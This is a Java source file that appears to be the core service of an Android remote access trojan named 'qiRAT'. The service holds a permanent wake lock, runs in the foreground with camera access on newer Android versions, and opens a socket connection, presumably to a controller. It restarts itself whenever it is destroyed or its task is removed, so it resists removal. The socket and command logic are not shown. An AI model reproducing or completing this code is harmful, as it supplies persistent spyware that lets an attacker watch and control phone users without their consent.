package com.qirat.stub;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;
import android.util.Log;

import androidx.core.app.NotificationCompat;

public class MainService extends Service {

    private static final String TAG = "MainService";
    private static final String NOTIFICATION_CHANNEL_ID = "MainServiceChannel";
    private static final int NOTIFICATION_ID = 1;

    private Socket socketManager;
    private PowerManager.WakeLock wakeLock;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        socketManager = Socket.getInstance(this);
        

        PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
        if (powerManager != null) {
            wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "qiRAT::ServiceWakeLock");
            wakeLock.acquire();
            Log.i(TAG, "WakeLock acquired");
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.i(TAG, "Service starting...");


        Notification notification = createNotification();
        
        if (Build.VERSION.SDK_INT >= 34) {
             startForeground(NOTIFICATION_ID, notification, 
                 android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE | 
                 android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA);
        } else {
            startForeground(NOTIFICATION_ID, notification);
        }

        if (socketManager == null) {
            Log.e(TAG, "Socket not initialized, stopping service.");
            stopSelf();
            return START_NOT_STICKY;
        }


        socketManager.connect();


        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.i(TAG, "Service destroying...");
        
        if (socketManager != null) {
            socketManager.disconnect();
        }
        
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
            Log.i(TAG, "WakeLock released");
        }
        
        stopForeground(true);
        

        restartService();
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        Log.i(TAG, "Task removed, restarting service...");
        restartService();
    }
    
    private void restartService() {
        Intent restartIntent = new Intent(getApplicationContext(), MainService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(restartIntent);
        } else {
            startService(restartIntent);
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    NOTIFICATION_CHANNEL_ID,
                    "Main Service Channel",
                    android.app.NotificationManager.IMPORTANCE_HIGH);
            serviceChannel.setShowBadge(false);
            serviceChannel.setSound(null, null);
            
            android.app.NotificationManager manager = getSystemService(android.app.NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(serviceChannel);
            }
        }
    }

    private Notification createNotification() {

        return new NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID)
                .setContentTitle(getString(R.string.app_name))
                .setContentText(getString(R.string.service_notification))
                .setSmallIcon(R.mipmap.ic_launcher)
                .setPriority(NotificationCompat.PRIORITY_HIGH)
                .setOngoing(true)
                .setAutoCancel(false)
                .build();
    }
}
